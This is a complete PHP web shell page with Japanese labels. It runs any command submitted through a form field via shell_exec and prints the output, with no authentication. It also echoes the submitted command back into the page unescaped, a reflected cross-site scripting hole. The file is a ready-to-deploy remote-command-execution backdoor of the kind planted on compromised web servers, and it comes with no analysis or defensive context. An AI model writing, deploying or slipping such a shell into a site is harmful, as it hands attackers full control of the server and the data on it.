<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
        }
        textarea {
            width: 100%;
            height: 200px;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
        }
    </style>
</head>
<body>

<h1>PHP Web Shell</h1>

<?php
$cmd = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // フォームからの入力を取得
    $cmd = $_POST['cmd'];
}
?>

<form method="post">
    <label for="cmd">コマンドを入力してください:</label><br>
    <input type="text" name="cmd" id="cmd" placeholder="例: ls -la" value="<?php echo $cmd ?>"><br><br>
    <input type="submit" value="実行">
</form>

<?php
// シェルコマンドを実行し、結果を取得
if (!empty($cmd)) {
    echo "<h2>コマンドの結果:</h2>";
    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
} else {
    echo "<p>コマンドを入力してください。</p>";
}
?>

</body>
</html>
